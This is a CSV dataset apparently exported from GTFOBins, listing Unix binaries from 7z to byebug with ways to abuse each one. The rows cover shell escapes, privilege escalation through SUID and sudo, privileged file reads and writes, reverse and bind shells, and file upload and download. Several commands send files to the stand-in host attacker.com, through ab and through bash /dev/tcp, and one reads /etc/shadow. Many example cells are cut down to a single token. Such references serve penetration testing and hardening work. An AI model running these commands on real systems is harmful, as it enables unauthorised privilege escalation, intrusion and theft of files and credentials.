Binary,Function Name,Function URL,Description,Example
7z,File read,https://gtfobins.github.io/gtfobins/7z/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
7z,Sudo,https://gtfobins.github.io/gtfobins/7z/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aa-exec,Shell,https://gtfobins.github.io/gtfobins/aa-exec/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,aa-exec /bin/sh
aa-exec,SUID,https://gtfobins.github.io/gtfobins/aa-exec/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
aa-exec,Sudo,https://gtfobins.github.io/gtfobins/aa-exec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ab,File upload,https://gtfobins.github.io/gtfobins/ab/#file-upload,It can exfiltrate files on the network.,"URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL"
ab,File download,https://gtfobins.github.io/gtfobins/ab/#file-download,It can download remote files.,"URL=http://attacker.com/file_to_download
ab -v2 $URL"
ab,SUID,https://gtfobins.github.io/gtfobins/ab/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ab,Sudo,https://gtfobins.github.io/gtfobins/ab/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
agetty,SUID,https://gtfobins.github.io/gtfobins/agetty/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
alpine,File read,https://gtfobins.github.io/gtfobins/alpine/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
alpine -F ""$LFILE"""
alpine,SUID,https://gtfobins.github.io/gtfobins/alpine/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
alpine,Sudo,https://gtfobins.github.io/gtfobins/alpine/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ansible-playbook,Shell,https://gtfobins.github.io/gtfobins/ansible-playbook/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF"
ansible-playbook,Sudo,https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ansible-test,Shell,https://gtfobins.github.io/gtfobins/ansible-test/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ansible-test shell
ansible-test,Sudo,https://gtfobins.github.io/gtfobins/ansible-test/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aoss,Shell,https://gtfobins.github.io/gtfobins/aoss/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,aoss /bin/sh
aoss,Sudo,https://gtfobins.github.io/gtfobins/aoss/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apache2ctl,File read,https://gtfobins.github.io/gtfobins/apache2ctl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
apache2ctl -c ""Include $LFILE"" -k stop"
apache2ctl,Sudo,https://gtfobins.github.io/gtfobins/apache2ctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apt-get,Shell,https://gtfobins.github.io/gtfobins/apt-get/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
apt-get,Sudo,https://gtfobins.github.io/gtfobins/apt-get/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apt,Shell,https://gtfobins.github.io/gtfobins/apt/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
apt,Sudo,https://gtfobins.github.io/gtfobins/apt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ar,File read,https://gtfobins.github.io/gtfobins/ar/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -u)
LFILE=file_to_read
ar r ""$TF"" ""$LFILE""
cat ""$TF"""
ar,SUID,https://gtfobins.github.io/gtfobins/ar/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ar,Sudo,https://gtfobins.github.io/gtfobins/ar/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aria2c,Command,https://gtfobins.github.io/gtfobins/aria2c/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='id'
TF=$(mktemp)
echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x"
aria2c,File download,https://gtfobins.github.io/gtfobins/aria2c/#file-download,It can download remote files.,--allow-overwrite
aria2c,Sudo,https://gtfobins.github.io/gtfobins/aria2c/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aria2c,Limited SUID,https://gtfobins.github.io/gtfobins/aria2c/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
arj,File write,https://gtfobins.github.io/gtfobins/arj/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR"
arj,File read,https://gtfobins.github.io/gtfobins/arj/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -u)
LFILE=file_to_read
arj a ""$TF"" ""$LFILE""
arj p ""$TF"""
arj,SUID,https://gtfobins.github.io/gtfobins/arj/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
arj,Sudo,https://gtfobins.github.io/gtfobins/arj/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
arp,File read,https://gtfobins.github.io/gtfobins/arp/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
arp -v -f ""$LFILE"""
arp,SUID,https://gtfobins.github.io/gtfobins/arp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
arp,Sudo,https://gtfobins.github.io/gtfobins/arp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
as,File read,https://gtfobins.github.io/gtfobins/as/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
as @$LFILE"
as,SUID,https://gtfobins.github.io/gtfobins/as/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
as,Sudo,https://gtfobins.github.io/gtfobins/as/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ascii-xfr,File read,https://gtfobins.github.io/gtfobins/ascii-xfr/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ascii-xfr -ns ""$LFILE"""
ascii-xfr,SUID,https://gtfobins.github.io/gtfobins/ascii-xfr/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ascii-xfr,Sudo,https://gtfobins.github.io/gtfobins/ascii-xfr/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ascii85,File read,https://gtfobins.github.io/gtfobins/ascii85/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ascii85 ""$LFILE"" | ascii85 --decode"
ascii85,Sudo,https://gtfobins.github.io/gtfobins/ascii85/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ash,Shell,https://gtfobins.github.io/gtfobins/ash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ash
ash,File write,https://gtfobins.github.io/gtfobins/ash/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'"
ash,SUID,https://gtfobins.github.io/gtfobins/ash/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ash,Sudo,https://gtfobins.github.io/gtfobins/ash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aspell,File read,https://gtfobins.github.io/gtfobins/aspell/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
aspell -c ""$LFILE"""
aspell,SUID,https://gtfobins.github.io/gtfobins/aspell/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
aspell,Sudo,https://gtfobins.github.io/gtfobins/aspell/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
at,Shell,https://gtfobins.github.io/gtfobins/at/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null"
at,Command,https://gtfobins.github.io/gtfobins/at/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
echo ""$COMMAND"" | at now"
at,Sudo,https://gtfobins.github.io/gtfobins/at/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
atobm,File read,https://gtfobins.github.io/gtfobins/atobm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'"
atobm,SUID,https://gtfobins.github.io/gtfobins/atobm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
atobm,Sudo,https://gtfobins.github.io/gtfobins/atobm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
awk,Shell,https://gtfobins.github.io/gtfobins/awk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"awk 'BEGIN {system(""/bin/sh"")}'"
awk,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
awk,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/awk/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
awk,File write,https://gtfobins.github.io/gtfobins/awk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
awk,File read,https://gtfobins.github.io/gtfobins/awk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
awk '//' ""$LFILE"""
awk,SUID,https://gtfobins.github.io/gtfobins/awk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
awk,Sudo,https://gtfobins.github.io/gtfobins/awk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
awk,Limited SUID,https://gtfobins.github.io/gtfobins/awk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
aws,Shell,https://gtfobins.github.io/gtfobins/aws/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
aws,Sudo,https://gtfobins.github.io/gtfobins/aws/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
base32,File read,https://gtfobins.github.io/gtfobins/base32/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
base32 ""$LFILE"" | base32 --decode"
base32,SUID,https://gtfobins.github.io/gtfobins/base32/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
base32,Sudo,https://gtfobins.github.io/gtfobins/base32/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
base58,File read,https://gtfobins.github.io/gtfobins/base58/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
base58 ""$LFILE"" | base58 --decode"
base58,Sudo,https://gtfobins.github.io/gtfobins/base58/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
base64,File read,https://gtfobins.github.io/gtfobins/base64/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
base64 ""$LFILE"" | base64 --decode"
base64,SUID,https://gtfobins.github.io/gtfobins/base64/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
base64,Sudo,https://gtfobins.github.io/gtfobins/base64/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
basenc,File read,https://gtfobins.github.io/gtfobins/basenc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64"
basenc,SUID,https://gtfobins.github.io/gtfobins/basenc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
basenc,Sudo,https://gtfobins.github.io/gtfobins/basenc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
basez,File read,https://gtfobins.github.io/gtfobins/basez/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
basez ""$LFILE"" | basez --decode"
basez,SUID,https://gtfobins.github.io/gtfobins/basez/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
basez,Sudo,https://gtfobins.github.io/gtfobins/basez/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bash,Shell,https://gtfobins.github.io/gtfobins/bash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,bash
bash,Reverse shell,https://gtfobins.github.io/gtfobins/bash/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
bash,File upload,https://gtfobins.github.io/gtfobins/bash/#file-upload,It can exfiltrate files on the network.,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'"
bash,File download,https://gtfobins.github.io/gtfobins/bash/#file-download,It can download remote files.,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'"
bash,File write,https://gtfobins.github.io/gtfobins/bash/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'"
bash,File read,https://gtfobins.github.io/gtfobins/bash/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
bash -c 'echo ""$(<$LFILE)""'"
bash,Library load,https://gtfobins.github.io/gtfobins/bash/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,bash -c 'enable -f ./lib.so x'
bash,SUID,https://gtfobins.github.io/gtfobins/bash/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bash,Sudo,https://gtfobins.github.io/gtfobins/bash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
batcat,Shell,https://gtfobins.github.io/gtfobins/batcat/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"batcat --paging always /etc/profile
!/bin/sh"
batcat,Sudo,https://gtfobins.github.io/gtfobins/batcat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
batcat,Limited SUID,https://gtfobins.github.io/gtfobins/batcat/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
bc,File read,https://gtfobins.github.io/gtfobins/bc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
bc -s $LFILE
quit"
bc,SUID,https://gtfobins.github.io/gtfobins/bc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bc,Sudo,https://gtfobins.github.io/gtfobins/bc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bconsole,Shell,https://gtfobins.github.io/gtfobins/bconsole/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"bconsole
@exec /bin/sh"
bconsole,File read,https://gtfobins.github.io/gtfobins/bconsole/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",bconsole -c /etc/shadow
bconsole,Sudo,https://gtfobins.github.io/gtfobins/bconsole/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bpftrace,Sudo,https://gtfobins.github.io/gtfobins/bpftrace/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bridge,File read,https://gtfobins.github.io/gtfobins/bridge/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
bridge -b ""$LFILE"""
bridge,SUID,https://gtfobins.github.io/gtfobins/bridge/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
bridge,Sudo,https://gtfobins.github.io/gtfobins/bridge/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bundle,Shell,https://gtfobins.github.io/gtfobins/bundle/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
bundle,Sudo,https://gtfobins.github.io/gtfobins/bundle/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
bundler,Shell,https://gtfobins.github.io/gtfobins/bundler/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
bundler,Sudo,https://gtfobins.github.io/gtfobins/bundler/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
busctl,Shell,https://gtfobins.github.io/gtfobins/busctl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
busctl,SUID,https://gtfobins.github.io/gtfobins/busctl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
busctl,Sudo,https://gtfobins.github.io/gtfobins/busctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
busybox,Shell,https://gtfobins.github.io/gtfobins/busybox/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,busybox sh
busybox,Reverse shell,https://gtfobins.github.io/gtfobins/busybox/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -lvp 12345
busybox,File upload,https://gtfobins.github.io/gtfobins/busybox/#file-upload,It can exfiltrate files on the network.,"LPORT=12345
busybox httpd -f -p $LPORT -h ."
busybox,File write,https://gtfobins.github.io/gtfobins/busybox/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
busybox sh -c 'echo ""DATA"" > $LFILE'"
busybox,File read,https://gtfobins.github.io/gtfobins/busybox/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
./busybox cat ""$LFILE"""
busybox,SUID,https://gtfobins.github.io/gtfobins/busybox/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
busybox,Sudo,https://gtfobins.github.io/gtfobins/busybox/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
byebug,Shell,https://gtfobins.github.io/gtfobins/byebug/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue"
